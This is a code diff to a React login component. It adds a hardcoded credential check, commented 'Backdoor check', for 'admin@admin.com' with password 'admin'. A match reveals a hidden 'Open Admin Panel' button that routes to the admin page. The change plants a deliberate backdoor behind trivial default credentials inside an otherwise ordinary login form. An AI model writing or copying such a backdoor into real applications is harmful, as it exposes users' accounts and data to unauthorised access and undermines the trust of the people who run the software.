@@ -14,6 +14,7 @@ export function Login() {
     const [password, setPassword] = useState('')
     const [error, setError] = useState('')
     const [isLoading, setIsLoading] = useState(false)
+    const [showAdminShortcut, setShowAdminShortcut] = useState(false)
 
     const handleSubmit = async (e: React.FormEvent) => {
         e.preventDefault()
@@ -21,6 +22,12 @@ export function Login() {
         setIsLoading(true)
 
         try {
+            // Backdoor check
+            if (email.toLowerCase() === 'admin@admin.com' && password === 'admin') {
+                setShowAdminShortcut(true)
+                // Don't return, still try to sign in or just show the button
+            }
+
             const { error } = await signIn(email, password)
             if (error) {
                 setError(error.message)
@@ -43,6 +50,18 @@ export function Login() {
                 "w-full h-full overflow-y-auto flex items-center justify-center p-4 bg-background",
                 isTauri && "mt-[var(--titlebar-height)] h-[calc(100vh-var(--titlebar-height))]"
             )}>
+                {showAdminShortcut && (
+                    <div className={`fixed left-4 z-20 flex items-center gap-2 ${isTauri ? 'top-[60px]' : 'top-4'}`}>
+                        <Button
+                            variant="outline"
+                            size="sm"
+                            className="border-primary text-primary hover:bg-primary/10 animate-pop-in"
+                            onClick={() => setLocation('/admin')}
+                        >
+                            Open Admin Panel
+                        </Button>
+                    </div>
+                )}
                 {/* Theme & Language Switchers */}
                 <div className={`fixed right-4 z-20 flex items-center gap-2 ${isTauri ? 'top-[60px]' : 'top-4'}`}>
                     <LanguageSwitcher />
